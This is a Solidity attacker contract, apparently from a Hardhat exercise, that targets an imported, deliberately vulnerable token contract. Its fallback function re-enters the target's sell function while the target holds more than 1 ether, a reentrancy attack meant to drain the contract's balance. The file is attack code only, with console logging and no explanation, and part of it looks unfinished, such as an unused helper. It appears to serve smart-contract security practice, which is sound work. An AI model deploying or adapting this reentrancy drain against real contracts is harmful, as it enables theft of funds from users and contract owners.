//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.10;

import "./TokenWithVotingValnurable.sol";
import "hardhat/console.sol";

contract TokenAttacker {
    TokenWithVotingValnurable private _contract;

    function toUint256(bytes memory _bytes)   
    internal
    pure
    returns (uint256 value) {
        assembly {
        value := mload(add(_bytes, 0x20))
        }
    }

    function attack(TokenWithVotingValnurable contract_) external payable {
        _contract = contract_;
        uint256 price = _contract.currentPrice();
        require(msg.value >= price, "Your value is under the current price");
        console.log(address(this).balance);
        try _contract.sell(1) returns(bool) {
        } catch {
            console.log("First sell error");
        }
        console.log(address(this).balance);
    }
    
    fallback() external payable {
        if (address(_contract).balance > 1 ether) {
            try _contract.sell(1000000000000000000) returns(bool) {

            }
            catch {
                console.log("Error");
            }
        }
    }
}